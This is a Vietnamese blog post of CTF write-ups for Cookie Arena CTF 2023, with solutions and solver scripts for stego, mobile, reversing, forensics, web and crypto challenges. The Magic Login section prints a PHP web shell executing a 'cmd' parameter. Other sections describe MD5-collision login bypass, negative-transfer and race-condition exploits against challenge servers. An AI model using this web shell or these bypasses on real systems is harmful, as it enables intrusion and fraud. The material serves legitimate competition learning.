---
layout: post
title:  Cookie Arena CTF 2023
comments: true
---

## Table of Contents 

- [0x00 Giới thiệu](#0x00-giới-thiệu)
- [0x01 Stenography](#0x01-stenography)
    * [Cutie K1tty](#cutie-k1tty)
- [0x02 Mobile](#0x02-mobile)
    * [Cat Me](#cat-me)
    * [Pinned Cookie](#pinned-cookie)
- [0x03 Reverse](#0x03-reverse)
    * [Pyreverse](#pyreverse)
    * [Jump](#jump)
    * [Rev1](#rev1)
- [0x04 Forensic](#0x04-forensic)
    * [Sổ đăng ký](#sổ-đăng-ký)
    * [Tin học văn phòng cơ bản](#tin-học-văn-phòng-cơ-bản)
- [0x05 Web](#0x05-web)
    * [Magic Login](#magic-login)
    * [Magic Login Harder](#magic-login-harder)
    * [Be Positive](#be-positive)
    * [Slow Down](#slow-down)
- [0x06 Crypto](#0x06-crypto)
    * [Basic Operator](#basic-operator)

## 0x00 Giới thiệu
Hai ngày cuối tuần, mình cùng một số anh em trong câu lạc bộ chơi giải [Cookie Arena CTF 2023](https://battle.cookiearena.org/arenas/cookie-arena-ctf-season-2). Cuộc thi được diễn ra liên tục trong 48 giờ. Chắc do bị DDOS bất ngờ, đáng lẽ cuộc thi được bắt đầu từ 21h nhưng phải hoãn lại. Sang tới tận ngày hôm sau chúng mình mới có thể chơi bình thường. 

Đây là lần đầu tiên mình tham gia trọn vẹn một kỳ thi CTF online. Cuộc thi diễn ra theo hình thức cá nhân, nhưng bọn mình lại chơi cùng nhau. Kết quả cả đội đứng thứ 6 chung cuộc nhưng sẽ không viết writeup và nhận quà từ ban tổ chức do vi phạm quy định hehe. 

Dưới đây là bài giải cho một số bài mình làm được trong cuộc thi và sau khi có được hướng dẫn từ các anh chị khác.  

![Alt text](/images/cookiehanhoan2023/image.png)

## 0x01 Stenography

### Cutie K1tty

**Description**

Một chú mèo cute chứa đựng nhiều điều bí ẩn. Hãy tìm ra điều thú vị đó.

Tải challenge: [CutieK1tty](https://drive.google.com/file/d/18iGHuowoRUsWqwNmnuWqrqsHbMLwBJG_/view?usp=drive_link) (pass: cookiehanhoan)

**Format FLAG: CHH{XXX}**

**Solution**

Bài toán cho chúng ta hình ảnh một con mèo 

![Alt text](/images/cookiehanhoan2023/cut3_c4t.png)

Như thường lệ, mình sẽ kiểm tra bức ảnh này có ẩn dấu những cụm từ nào đáng chú ý hay không 

```shell
$ strings cut3_c4t.png
y0u_4r3_cl0s3.rar
Cat!
f1n4lly.txt
```

Chúng ta thấy có khá nhiều từ khả nghi ở đây. mình sẽ thử chuyển file png này thành file zip để xem có thể khai thác được gì không. 

Khi giải nén ra, ta thu được 2 file mới là `purrr_2.mp3` và `y0u_4r3_cl0s3.rar`. Tiếp tục giải nén file `y0u_4r3_cl0s3.rar`, xuất hiện thông báo lỗi 

![Alt text](/images/cookiehanhoan2023/image-5.png)

Đưa file này vào `HxD` để kiểm tra các magic byte, phát hiện ra file đã bị corrupt do header của nó là **Cat**. Ở đây, chúng ta chỉ cần sửa header lại thành **Rar** là có thể giải nén được.

![Alt text](/images/cookiehanhoan2023/image-6.png)

Nhận thấy còn file `purrr_2.mp3` chưa được sử dụng. Khả năng cao nó chứa password của file rar ở trên. 

Sử dụng tool `Audacity`, ta có được **sp3ctrum_1s_y0ur_fr13nd** là password để giải nén. 

![Alt text](/images/cookiehanhoan2023/image-8.png)

Đến đây, chúng ta chỉ cần decode base64 quen thuộc sẽ tìm ra được flag 

```js
atob("ZjByM241MWNzX21hNXQzcg==")
'f0r3n51cs_ma5t3r'
```

**Flag: CHH{f0r3n51cs_ma5t3r}**

## 0x02 Mobile 

### Cat Me 

**Description** 

Với người dùng bình thường, họ không thể nhìn thấy gì. Nhưng hacker thì họ luôn có cách khác. Ứng dụng hoạt động tốt trên các thiết bị Android API 24 trở lên

Tải challenge: [Cat Me](https://drive.google.com/file/d/1Uq8wLlBl3glN5nbHMW5tkiP5IDrZlJ0D/view?usp=drive_link) (pass: cookiehanhoan)

**Format FLAG: CHH{XXX}**

**Solution**

Dùng `jadx` để decompile file apk. Sử dụng search để tìm các cụm từ khả nghi. Khi search từ khóa **flag**, chúng ta thấy có đoạn mã sau khả nghi. 

![Alt text](/images/cookiehanhoan2023/image-4.png)

Copy hết các ký tự trong `arrayList`, nhận thấy rằng đây là **base64**. 

```python
import base64

flag = "Q0hIe00wcmVfMW43RVIzU1RJTjlfN2gxTjZfMU5fbG9nY2F0fQ=="
flag = base64.b64decode(flag)
print(flag)
```

**Flag: CHH{M0re_1n7ER3STIN9_7h1N6_1N_logcat}**

### Pinned Cookie

**Description**

Một kết nối cực an toàn giữa người dùng và server đã được thiết lập. Kẻ tấn công không thể đứng giữa để nghe ngóng thông tin. Ứng dụng hoạt động tốt trên các thiết bị Android API 24 trở lên

Tải challenge: [Pinned Cookie](https://drive.google.com/file/d/1oagLC-ryf9leAl4LrD9zVETTB6cPZDk_/view?usp=drive_link) (pass: cookiehanhoan)

**Format FLAG: CHH{XXX}**

**Solution**

Quan sát trong `jadx`, chúng ta thấy có hàm `MainActivity`

![Alt text](/images/cookiehanhoan2023/image-2.png)

Nhìn tổng quan hàm, chúng ta lại thấy đoạn code `arrayList` quen thuộc giống như bài `Cat Me`. Ở đây, xuất hiện thêm một chuỗi lạ là **"sTroN6PaSswORD"**. 

![Alt text](/images/cookiehanhoan2023/image-1.png)

Tiếp tục đi sâu vào từng hàm có liên quan tới chuỗi này. Chúng ta tìm thấy một hàm khả nghi 

![Alt text](/images/cookiehanhoan2023/image-3.png)

Nội dung chính của hàm `y0` này là đi decode chuỗi base64 thu được từ `arrayList`, tiếp đến xor từng byte một với chuỗi ký tự **"sTroN6PaSswORD"**. 

```python
import base64 

key = b'sTroN6PaSswORD'
base64_str = b'MBw6FDdZBT4wRzkQMB0jYEc8EUUDLQwjPiE8LR0TDw=='

bytesFlag = base64.b64decode(base64_str)

flag = ""
for i in range(len(bytesFlag)): 
    flag += chr(bytesFlag[i] ^ key[i % len(key)])

print(flag)
```

**Flag: CHH{yoU_c4N_bYP45S_sSL_PInninG}**


## 0x03 Reverse

### Pyreverse

**Description**

Trong quá trình phân tích các Tool Auto Game, chúng mình phát hiện ra kỹ thuật khá phổ biến trong việc viết mã và đóng gói chương trình. Hãy tìm ra kỹ thuật này và tìm cách dịch ngược chúng, FLAG bí mật ẩn được ẩn chứa bên trong.

Tải challenge: [Pyreverse](https://drive.google.com/file/d/18g2ZqlfYS4pfEZbAxJD1_9wIVp3KS1A-/view?usp=drive_link) (pass: cookiehanhoan)

**Format FLAG: CHH{XXX}**

**Solution**

Sử dụng `Detect It Easy`, kiểm tra file **.exe** được pack bằng **PyInstaller**. Tới đây, mình sử dụng công cụ [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor) để unpack lại file **.py** ban đầu.

![Alt text](/images/cookiehanhoan2023/image-7.png)

Sau khi thu được file `pyreverser.pyc`, mình tiếp tục lên [CTFever](https://ctfever.uniiem.com) để decompile file **.pyc** thành **.py** ban đầu. 

```python
# Decompiled on CTFever Premium
# Decompile engine: Decompyle++ (pycdc)
# Python version: 3.10

import base64

def reverse_string(s):
    return s[::-1]


def scramble_flag(flag):
    scrambled = ''
    for i, char in enumerate(flag):
        if i % 2 == 0:
            scrambled += chr(ord(char) + 1)
            continue
        scrambled += chr(ord(char) - 1)
    return scrambled


def main():
    secret_flag = scramble_flag(reverse_string(base64.b64decode('Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ==')).decode())
    print('Welcome to PyReverser!')
    print('Please enter a word or phrase:')
    user_input = input()
    generated_value = scramble_flag(reverse_string(user_input.upper()))
    print('Generated value:', generated_value)
    print('Can you find the hidden flag?')
    reversed_flag = reverse_string(secret_flag)
    print('Reversed flag:', reversed_flag)

if __name__ == '__main__':
    main()
    # return None
```

Dễ dàng decode base64 đoạn mã `Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ==`, chúng ta sẽ có được flag.

```js
atob("Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ==")
'Flag: CHH{python2Exi_Reverse_ENginering}'
```

**Flag: CHH{python2Exi_Reverse_ENginering}**

### Jump

**Description**

Thử thách mô phỏng lại thuật toán sinh key bản quyền phần mềm, hãy chạy thử file chương trình và dịch ngược chúng để tìm FLAG ẩn chứa bên trong.

Tải challenge: [Jump](https://drive.google.com/file/d/1nCOaD5emAyAqQmJrhB8hlu4UdCbBmRuH/view?usp=drive_link) (pass: cookiehanhoan)

**Format FLAG: CHH{XXX}**

**Solution**

Bài toán cho chúng ta một file `jump.exe`. Bỏ file này vào `IDAPRO 32`, chúng ta thấy được đoạn mã giả của hàm `main`. 

![Alt text](/images/cookiehanhoan2023/image-10.png)

Nhiệm vụ của hàm `main` là cho nhập giá trị vào biến `jump` rồi nhảy đến địa chỉ đó. Vì vậy, chúng ta chỉ cần nhảy đến địa chỉ hàm `_flag` là có thể lấy được flag. 

Lưu ý: **0x00401500 = 4199680**

![Alt text](/images/cookiehanhoan2023/image-11.png)

**Flag: CHH{JUMP_T0_TH3_M00N}**

### Rev1

**Description**

Thử thách mô phỏng lại thuật toán sinh key bản quyền phần mềm, hãy chạy thử file chương trình và dịch ngược chúng để tìm FLAG ẩn chứa bên trong.

Tải challenge: [Rev1](https://drive.google.com/file/d/1rzlX1TX4J8XDBuSUj3s8EtErXCOeKKVj/view?usp=sharing) (pass: cookiehanhoan)

**Format FLAG: CHH{XXX}**

**Solution**

Bài này mình không biết debug nên mình lấy luôn code của các bạn đã writeup. 

```
debug055:02760002 movzx   eax, byte ptr [edi+ecx]
debug055:02760006 imul    eax, 6Eh ; 'n'
debug055:02760009 inc     ecx
debug055:0276000A movzx   edx, byte ptr [edi+ecx]
debug055:0276000E imul    edx, 1C3h
debug055:02760014 add     eax, edx
debug055:02760016 inc     ecx
debug055:02760017 movzx   edx, byte ptr [edi+ecx]
debug055:0276001B imul    edx, 348h
debug055:02760021 add     eax, edx
debug055:02760023 inc     ecx
debug055:02760024 movzx   edx, byte ptr [edi+ecx]
debug055:02760028 imul    edx, 1F8h
debug055:0276002E add     eax, edx
debug055:02760030 inc     ecx
debug055:02760031 movzx   edx, byte ptr [edi+ecx]
debug055:02760035 imul    edx, 357h
debug055:0276003B sub     eax, edx
debug055:0276003D inc     ecx
debug055:0276003E movzx   edx, byte ptr [edi+ecx]
debug055:02760042 imul    edx, 46h ; 'F'
debug055:02760045 add     eax, edx
debug055:02760047 inc     ecx
debug055:02760048 movzx   edx, byte ptr [edi+ecx]
debug055:0276004C imul    edx, 16Fh
debug055:02760052 sub     eax, edx
debug055:02760054 inc     ecx
debug055:02760055 movzx   edx, byte ptr [edi+ecx]
debug055:02760059 imul    edx, 2FEh
debug055:0276005F sub     eax, edx
debug055:02760061 inc     ecx
debug055:02760062 movzx   edx, byte ptr [edi+ecx]
debug055:02760066 imul    edx, 17Ah
debug055:0276006C add     eax, edx
debug055:0276006E inc     ecx
debug055:0276006F movzx   edx, byte ptr [edi+ecx]
debug055:02760073 imul    edx, 15Ah
debug055:02760079 add     eax, edx
debug055:0276007B inc     ecx
debug055:0276007C movzx   edx, byte ptr [edi+ecx]
debug055:02760080 imul    edx, 326h
debug055:02760086 sub     eax, edx
debug055:02760088 inc     ecx
debug055:02760089 movzx   edx, byte ptr [edi+ecx]
debug055:0276008D imul    edx, 190h
debug055:02760093 sub     eax, edx
debug055:02760095 inc     ecx
debug055:02760096 movzx   edx, byte ptr [edi+ecx]
debug055:0276009A imul    edx, 129h
debug055:027600A0 add     eax, edx
debug055:027600A2 inc     ecx
debug055:027600A3 movzx   edx, byte ptr [edi+ecx]
debug055:027600A7 imul    edx, 2EDh
debug055:027600AD add     eax, edx
debug055:027600AF inc     ecx
debug055:027600B0 movzx   edx, byte ptr [edi+ecx]
debug055:027600B4 cmp     eax, 29CBh
```

Đến đây, bài toán đưa về việc giải hệ phương trình 14 phương trình, 14 ẩn. Để giải hệ phương trình này, các bạn có thể giải tay bằng những kiến thức đã được học trong môn ĐSTT haha. 

Còn mình sẽ sử dụng Z3 để giải quyết bài toán này. 

```python
from z3 import *

solver = Solver()

v = [BitVec(f'x{i}', 32) for i in range(14)]

equations = [
    0x6E * v[0] + 0x1C3 * v[1] + 0x348 * v[2] + 0x1F8 * v[3] - 0x357 * v[4] + 0x46 * v[5] - 0x16F * v[6] - 0x2FE * v[7] + 0x17A * v[8] + 0x15A * v[9] - 0x326 * v[10] - 0x190 * v[11] + 0x129 * v[12] + 0x2ED * v[13] == 0x29CB,
    0x2A * v[0] + 0x3B2 * v[1] + 0x2C1 * v[2] + 0x23A * v[3] - 0x3D1 * v[4] + 0x152 * v[5] + 0x221 * v[6] - 0x2FC * v[7] - 0x0DF * v[8] - 0x36F * v[9] + 0x1A2 * v[10] + 0x179 * v[11] + 0x284 * v[12] - 0x64 * v[13] == 0x0F0ED,
    0x328 * v[0] + 0x3CD * v[1] + 0x3CC * v[2] + 0x329 * v[3] + 0x0EA * v[4] - 0x1A * v[5] + 0x12B * v[6] - 0x2E * v[7] - 0x337 * v[8] + 0x262 * v[9] + 0x37 * v[10] - 0x0A4 * v[11] + 0x383 * v[12] + 0x2D5 * v[13] == 0x66098,
    0x66 * v[0] - 0x3C9 * v[1] - 0x0C0 * v[2] - 0x0BD * v[3] - 0x9D * v[4] + 0x2D1 * v[5] - 0x299 * v[6] + 0x38E * v[7] + 0x15 * v[8] - 0x14E * v[9] + 0x280 * v[10] + 0x0E1 * v[11] - 0x128 * v[12] + 0x50 * v[13] == 0x6CE4,
    0x2ED * v[0] + 0x8A * v[1] - 0x155 * v[2] - 0x8C * v[3] - 0x239 * v[4] + 0x259 * v[5] - 0x286 * v[6] - 0x1DA * v[7] + 0x154 * v[8] - 0x196 * v[9] + 0x97 * v[10] + 0x26D * v[11] + 0x3E0 * v[12] - 0x1EB * v[13] == 0x150DD,
    0x46 * v[0] - 0x2DF * v[1] + 0x243 * v[2] + 0x78 * v[3] - 0x0EE * v[4] + 0x99 * v[5] - 0x0C5 * v[6] - 0x0EB * v[7] - 0x0AE * v[8] + 0x28F * v[9] - 0x65 * v[10] + 0x20B * v[11] - 0x147 * v[12] + 0x3C2 * v[13] == 0x1E68B,
    0x264 * v[0] + 0x2BE * v[1] + 0x3B5 * v[2] - 0x1D3 * v[3] - 0x8 * v[4] - 0x150 * v[5] + 0x3C1 * v[6] - 0x3E4 * v[7] - 0x58 * v[8] - 0x19C * v[9] + 0x3AA * v[10] + 0x261 * v[11] - 0x17F * v[12] - 0x167 * v[13] == 0x18490,
    0x0B3 * v[0] - 0x63 * v[1] - 0x0E0 * v[2] + 0x24 * v[3] + 0x37C * v[4] + 0x0AA * v[5] + 0x33 * v[6] - 0x11E * v[7] - 0x13D * v[8] + 0x139 * v[9] + 0x3DC * v[10] - 0x14C * v[11] + 0x2DD * v[12] + 0x2B3 * v[13] == 0x3CC54,
    0x102 * v[0] + 0x115 * v[1] + 0x0D3 * v[2] + 0x0DC * v[3] + 0x3A1 * v[4] - 0x35C * v[5] - 0x0ED * v[6] + 0x141 * v[7] - 0x19C * v[8] - 0x2B6 * v[9] + 0x3CC * v[10] + 0x3AA * v[11] + 0x24B * v[12] + 0x1B9 * v[13] == 0x45670,
    0x3C4 * v[0] + 0x305 * v[1] - 0x0A9 * v[2] + 0x87 * v[3] - 0x0E6 * v[4] + 0x30 * v[5] + 0x20F * v[6] - 0x3D0 * v[7] - 0x94 * v[8] - 0x2CC * v[9] + 0x56 * v[10] + 0x224 * v[11] + 0x1B5 * v[12] + 0x183 * v[13] == 0x21A0F,
    0x256 * v[0] + 0x157 * v[1] + 0x181 * v[2] - 0x306 * v[3] - 0x243 * v[4] - 0x9 * v[5] - 0x373 * v[6] - 0x1A3 * v[7] + 0x223 * v[8] + 0x200 * v[9] - 0x365 * v[10] - 0x56 * v[11] + 0x1B6 * v[12] - 0x39C * v[13] == 0x0FFFE3896,
    0x0A3 * v[0] + 0x2B2 * v[1] + 0x22D * v[2] + 0x3D6 * v[3] - 0x9A * v[4] - 0x76 * v[5] - 0x2A0 * v[6] + 0x63 * v[7] + 0x373 * v[8] + 0x15 * v[9] - 0x3B9 * v[10] + 0x214 * v[11] - 0x232 * v[12] + 0x225 * v[13] == 0x22874,
    0x151 * v[0] + 0x153 * v[1] + 0x25F * v[2] - 0x187 * v[3] - 0x2AC * v[4] + 0x1CC * v[5] - 0x155 * v[6] - 0x2F5 * v[7] - 0x22D * v[8] + 0x17B * v[9] - 0x377 * v[10] - 0x0B2 * v[11] - 0x294 * v[12] - 0x2CE * v[13] == 0x0FFFBEC4D,
    0x2AA * v[0] + 0x95 * v[1] + 0x83 * v[2] + 0x25B * v[3] - 0x77 * v[4] - 0x2E1 * v[5] + 0x39D * v[6] + 0x251 * v[7] + 0x0A2 * v[8] - 0x27D * v[9] + 0x268 * v[10] + 0x2F9 * v[11] + 0x14 * v[12] - 0x115 * v[13] == 0x3C5E6
]

for equation in equations:
    solver.add(equation)

if solver.check() == sat:
    model = solver.model()
    solution = [model.evaluate(i).as_long() for i in v]
    print(f'{solution}')
else:
    print("No solution")
    
flag = ""
for i in solution:
    flag += chr(i)
print(flag)
```

**Key: q20OK36QBiWkZT**

![Alt text](/images/cookiehanhoan2023/image-12.png)

**Flag: CHH{COOk13_4R3n4}**

## 0x04 Forensic

### Sổ đăng ký
**Description**

Hòa thấy hiện tượng lạ mỗi khi anh ta khởi động máy tính. Anh ta nghĩ rằng việc tải các video không lành mạnh gần đây đã khiến máy tính của anh ta bị hack.

Tải challenge: [Sổ đăng ký](https://drive.google.com/file/d/1pShye_YtnUuIObPdnq9PeiIge0Oelsix/view?usp=drive_link) (pass: cookiehanhoan)

**Format FLAG: CHH{XXX}**

**Solution**

Bài toán này, chúng ta nhận được file `NTUSER.DAT`. Mở file bằng tool `Registry Finder`, tìm những từ khóa như **cmd.exe**, **powershell.exe** để xem có thể khai thác được thông tin gì không. 

Chúng ta thu được một đoạn shell code khả nghi. 

![Alt text](/images/cookiehanhoan2023/image-13.png)

Nhận thấy có mã hóa base64. Chúng ta đem lên [CyberChef](https://gchq.github.io/CyberChef/) để giải mã và thu được flag. 

![Alt text](/images/cookiehanhoan2023/image-9.png)

**Flag: CHH{N0_4_go_n0_st4r_wh3r3}**

### Tin học văn phòng cơ bản
**Description**

Sau khi tham gia một khóa Tin học văn phòng cơ bản, Hòa đã có thể tự tạo một tệp tài liệu độc hại và anh ta có ý định sẽ dùng nó để hack cả thế giới

Tải challenge: [Tin học văn phòng cơ bản](https://drive.google.com/file/d/1WrLFE5qA-qJ6iLEQYQqCo0Xb99Yz8mTH/view?usp=drive_link) (pass: cookiehanhoan)

**Format FLAG: CHH{XXX}**

**Solution**

Chúng ta sử dụng tool `olevba` để kiểm tra các macro VBA. 

![Alt text](/images/cookiehanhoan2023/image-15.png)

**Flag: CHH{If_u_w4nt_1_will_aft3rnull_u}**

## 0x05 Web 

### Magic Login 

**Description**

Hãy quan sát chức năng đăng nhập, nó có tồn tại những lỗ hổng nghiêm trọng. FLAG được lưu trong `/flag.txt` hãy tìm cách đọc được chúng.

**Format Flag: CHH{XXX}**

**Solution**

![Alt text](/images/cookiehanhoan2023/image-14.png)

Để giải quyết bài toán này, `password` sau khi hash sha256 phải bằng 0. Những hash này đều có điểm chung là bắt đầu bằng **0e**. 

Lên [https://github.com/spaze/hashes](https://github.com/spaze/hashes/blob/master/sha256.md), chọn một password tùy thích. 

Đăng nhập với **password = TyNOQHUS**. Đến đây, chúng ta chỉ cần upload shell đơn giản.

```php
<?php
    echo system($_GET['cmd']);
?>
```

![Alt text](/images/cookiehanhoan2023/image-16.png)

**Flag: CHH{PHP_m4g1c_tr1ck_0lD_but_g0lD_ec3f73ad46f1da5e1f1931a0bb288e0c}**

### Magic Login Harder

**Description**

Hãy quan sát chức năng đăng nhập, nó có tồn tại những lỗ hổng nghiêm trọng. FLAG được lưu trong `/flagXXX.txt` hãy tìm cách đọc được chúng.

```
FLAG=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1)
cp /flag.txt /flag$FLAG.txt
```
Tải challenge: [Magic Login Harder](https://drive.google.com/file/d/1ZSmsdcJ3iFR2KH4aSBQ9z4xlY-z8o-UH) (pass: cookiehanhoan)

**Format Flag: CHH{XXX}**

**Solution**

```php
<?php
    if(isset($_POST["submit"])){
        $username = base64_decode($_POST['username']);
        $password = base64_decode($_POST['password']);

        if(($username == $password)){
            echo 'Username and password are not the same';
        }
        else if((md5($username)===md5($password))){
            $_SESSION['username'] = $username;
            header('Location: admin.php?file=1.txt');
        } else {
            echo 'Username and password are wrong';
        }
    }
?>
```

Để giải quyết bài toán này, chúng ta phải đi tìm 2 chuỗi **username** và **password** khác nhau nhưng đều có cùng giá trị MD5. Hướng khai thác **MD5 Collision**

Chỉ cần lên Google, search một chút về vấn đề này, chúng ta có được kết quả khá ưng ý. 

- [Can two different strings generate the same MD5 hash code?](https://stackoverflow.com/questions/1756004/can-two-different-strings-generate-the-same-md5-hash-code)
- [MD5 Collision Demo](https://www.mscs.dal.ca/~selinger/md5collision)

```python
import hashlib
import base64

x = '4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2'
y = '4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2'

x = bytes.fromhex(x)
y = bytes.fromhex(y)

print(x == y, hashlib.md5(x).hexdigest() == hashlib.md5(y).hexdigest())

x = base64.b64encode(x)
y = base64.b64encode(y)

print(x)
print(y)

# x = Tclo/w7jXCCVctR3e3IVh9Nvp7Ib3Fa3Sj3AeD57lRivv6IAqChL826OS1WzX0J1k9hJZ22g0VVdg2D7Xwf+og==
# y = Tclo/w7jXCCVctR3e3IVh9Nvp7Ib3Fa3Sj3AeD57lRivv6ICqChL826OS1WzX0J1k9hJZ22g0dVdg2D7Xwf+og==
```

Login thành công với cặp **(x, y)** thu được ở trên. Sau đó chuyển qua trang `admin.php` để xử lý tiếp bài toán. 

### Be Positive

**Description**

Libra Dnuf Marketplace

Libra Dnuf is known underground as a marketplace to sell sensitive information and lost secrets. This place has long closed registration but only allows reputable members to exchange items. During a reconnaissance, 0x1115 team caught the exchange of two members codenamed alice and bob.

After analyzing the packets, 0x1115 was able to decrypt the passwords for alice and bob that matched the usernames. With this loophole, the analysis team continues to detect the Transfer Function between users after passing the authentication portal.

To avoid wake a sleeping dog, 0x1115 quickly took a snapshot of Libra Dnuf market and transferred it to CookieArena for investigation to find the important file in the flag package. We also recommend to be careful with the rollback option, because using this function all data will be reset to its original state.

**Solution**

Từ tên bài toán và là bài web dễ nhất trong đề. Khả năng cao bài toán sẽ có lỗ hổng chuyển tiền âm. 

Vào tab `Transfer`, chỉnh sửa giá trị `min = -99999` rồi chuyển tiền cho Bob với số tiền là `-2000`. 

![Alt text](/images/cookiehanhoan2023/image-17.png)

Bây giờ, chúng ta đã có dư tiền để mua flag. 

![Alt text](/images/cookiehanhoan2023/image-18.png)

**Flag: CHH{BE_cAr3fUL_WitH_NE6ATIV3_NumBeR_a2c3d35c666e930911bfb0777e1e93ae}**

### Slow Down

**Description**

Libra Dnuf Marketplace

Libra Dnuf is known underground as a marketplace to sell sensitive information and lost secrets. This place has long closed registration but only allows reputable members to exchange items. During a reconnaissance, 0x1115 team caught the exchange of two members codenamed alice and bob.

After analyzing the packets, 0x1115 was able to decrypt the passwords for alice and bob that matched the usernames. With this loophole, the analysis team continues to detect the Transfer Function between users after passing the authentication portal.

To avoid wake a sleeping dog, 0x1115 quickly took a snapshot of Libra Dnuf market and transferred it to CookieArena for investigation to find the important file in the flag package. We also recommend to be careful with the rollback option, because using this function all data will be reset to its original state.

**Solution**

Ở bài toán này, cấu trúc tương tự như bài `Be Positive` nhưng đã bị filter số âm. 

Nhận thấy, phản hồi chuyển tiền thành công về khá lâu, cộng thêm tên bài toán là `Slow Down`. Từ đấy, mình nghĩ hướng xử lý bài toán liên quan tới **Race Condition**. 

Sử dụng 2 trình duyệt khác nhau, cùng login với tài khoản Alice và chuyển tiền đến Bob. 

![Alt text](/images/cookiehanhoan2023/image-19.png)

**Flag: CHH{ea5y_RaCe_CONd17iOn_e84d1b098a499d032afe243ab64dd49a}**

## 0x06 Crypto 

### Basic Operator

**Description**

Sử dụng kiến thức toán học và cấu trúc đại số để giải mã flag

Tải challenge: [Basic Operator](https://drive.google.com/file/d/12t2NfEJISC_TSI0FFjqiHDEQmlGEH195) (pass: cookiehanhoan)

**Solution**

```python
from Crypto.Util import number

def padding_pkcs7(data,block_size=4):
	tmp = len(data) + (block_size - len(data) % block_size)
	return data.ljust(tmp,bytes([block_size-(len(data)%block_size)]))

def split_block(data,block_size):
	return list(int.from_bytes(data[i:i+block_size],'little') for i in range(0,len(data),block_size))

def plus_func(data,shift):
	return (data+shift)&0xffffffff

def mul_func(data,mul):
	return (data*mul)&0xffffffff

def xor_shift_right_func(data,bit_loc):
	return (data^(data>>bit_loc))&0xffffffff

def pow_func(data,e,p):
	return pow(data,e,p)

def exp_func(data,base,p):
	return pow(base,data,p)

def ecb_mode(data):
	return list(pow_func(exp_func(xor_shift_right_func(mul_func(plus_func(block,3442055609),2898124289),1),e,p),e,p) for block in split_block(padding_pkcs7(data,4),4))

if __name__=='__main__':
	p = 1341161101353773850779
	e = 2
	mess = b'CHH{CENSORED}'
	cipher_flag = ecb_mode(mess)
	print(cipher_flag)
```

Nhận thấy bài toán mã hóa từng block 4 byte một. Vì vậy, chúng ta hoàn toàn có thể brute-force các kí tự để đoán từng block một. 
Để giải quyết bài toán này, chúng ta có hai cách để giải: 
- Brute-force từng block một như đã phân tích ở trên 
- Dựng ngược lại các hàm đã cho để đi tìm flag 

**Cách giải 1.**

Nhận thấy rằng `Cipher` có 12 block, với 4 chữ cái đầu tiên của flag sẽ là **"CHH{"**. Quan sát kết quả mã hóa block đầu tiên này và so sánh với `Cipher`, ta khẳng định được: 
- Block đầu tiên của flag là **"CHH{"**
- Block cuối cùng của flag có 1, 2 hoặc 3 kí tự. Vậy các trường hợp có thể xảy ra là:
    - b'}\x03\x03\x03'
    - b'x}\x02\x02'
    - b'xx}\x01'

```python
from tqdm import tqdm
from string import printable

def padding_pkcs7(data,block_size=4):
	tmp = len(data) + (block_size - len(data) % block_size)
	return data.ljust(tmp,bytes([block_size-(len(data)%block_size)]))

def split_block(data,block_size):
	return list(int.from_bytes(data[i:i+block_size],'little') for i in range(0,len(data),block_size))

def plus_func(data,shift):
	return (data+shift)&0xffffffff

def mul_func(data,mul):
	return (data*mul)&0xffffffff

def xor_shift_right_func(data,bit_loc):
	return (data^(data>>bit_loc))&0xffffffff

def pow_func(data,e,p):
	return pow(data,e,p)

def exp_func(data,base,p):
	return pow(base,data,p)

def ecb_mode(data):
	return list(pow_func(exp_func(xor_shift_right_func(mul_func(plus_func(block,3442055609),2898124289),1),e,p),e,p) for block in split_block(padding_pkcs7(data,4),4))

p = 1341161101353773850779
e = 2
Cipher = [752589857254588976778, 854606763225554935934, 102518422244000685572, 779286449062901931327, 424602910997772742508, 1194307203769437983433, 501056821915021871618, 691835640758326884371, 778501969928317687301, 1260460302610253211574, 833211399330573153864, 223847974292916916557]

def brute(index):
    if index != 11:
        for x in tqdm(range(len(printable))):
            for y in tqdm(range(len(printable))):
                for z in range(len(printable)):
                    for t in range(len(printable)):
                        flag = (printable[x] + printable[y] + printable[z] + printable[t]).encode() 
                        if ecb_mode(flag)[0] == Cipher[index]: 
                            print(flag) 
                            exit()
    else: 
        # b'}\x03\x03\x03'
        # b'x}\x02\x02'
        # b'xx}\x01'

        for x in tqdm(range(len(printable))):
            for y in range(len(printable)):
                flag = (printable[x] + printable[y] + '}').encode()
                if ecb_mode(flag)[0] == Cipher[index]: 
                    print(flag) 
                    exit()
            flag = (printable[y] + '}').encode()
            if ecb_mode(flag)[0] == Cipher[index]: 
                print(flag) 
                exit()
            
if __name__ == '__main__':
    for i in range(12):
        brute(i)
```

**Flag: CHH{w3lc0m3_70_7h3_m47h_w0rld(1_h4t3_1t_th3r3)}**